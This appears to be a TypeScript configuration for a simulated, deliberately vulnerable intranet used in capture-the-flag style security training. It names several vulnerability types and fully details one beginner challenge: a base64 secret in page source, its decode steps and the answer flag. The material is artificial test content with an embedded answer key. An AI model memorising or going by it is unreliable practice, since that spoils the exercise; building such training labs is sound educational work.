export const SIMULATED_WEB_APP: VulnerableWebApp = {
  id: 'novacorp-internal',
  name: 'NovaCorp Internal Portal',
  description: 'A deliberately vulnerable corporate intranet portal designed for security training. This simulated environment contains common web vulnerabilities including SQL injection, XSS, IDOR, command injection, path traversal, CSRF, and JWT tampering. All data and pages are simulated — no real vulnerabilities are present.',
  baseUrl: 'http://novacorp.local:8080',
  pages: [LOGIN_PAGE, DASHBOARD_PAGE, PROFILE_PAGE, SEARCH_PAGE, API_PAGE, UPLOAD_PAGE, ADMIN_PAGE],
  vulnerabilities: [
    LOGIN_PAGE.vulnerabilities[0],
    SEARCH_PAGE.vulnerabilities[0],
    PROFILE_PAGE.vulnerabilities[0],
    ADMIN_PAGE.vulnerabilities[0],
    ADMIN_PAGE.vulnerabilities[1],
    API_PAGE.vulnerabilities[0],
    UPLOAD_PAGE.vulnerabilities[0],
    PROFILE_PAGE.vulnerabilities[1],
    {
      id: 'vuln-010',
      name: 'Base64 Encoded Secret in Source',
      type: 'base64-encoding',
      description: 'The HTML source contains a base64-encoded string that when decoded reveals a hidden secret. This teaches students to always inspect source code thoroughly.',
      difficulty: 'beginner',
      steps: [
        'Open the admin panel page in your browser',
        'Right click and select "View Page Source" (or press Ctrl+U)',
        'Scroll through the HTML source looking for comments',
        'Find the following string: U0VDUkVUX1RPS0VOX0FCQ0RFRkc=',
        'Decode the base64 string: echo "U0VDUkVUX1RPS0VOX0FCQ0RFRkc=" | base64 -d',
        'The decoded string is the flag'
      ],
      flag: 'FLAG{vuln_base64_secret_decode}',
      cpReward: 150,
    },
  ],
};
